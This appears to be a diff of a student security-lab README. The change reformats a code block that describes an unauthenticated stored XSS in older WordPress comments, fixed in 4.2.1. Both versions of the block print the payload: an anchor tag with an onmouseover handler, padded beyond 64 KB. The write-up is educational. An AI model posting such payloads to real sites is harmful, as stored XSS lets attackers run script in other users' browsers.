@@ -15,9 +15,7 @@ Time spent: **X** hours spent in total
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: ![unauthenticated stored xss](https://user-images.githubusercontent.com/18065015/38169116-084875f0-352f-11e8-9747-450b6a514fd5.gif)
   - [ ] Steps to recreate: Posted the following comment in Javascript and made the comment longer than 64 KB:
-   '''
-   <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-   '''
+   ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>```
   - [ ] Affected source code: 
     - [Link 1](http://klikki.fi/adv/wordpress2.html)
 1. (Required) Vulnerability Name or ID
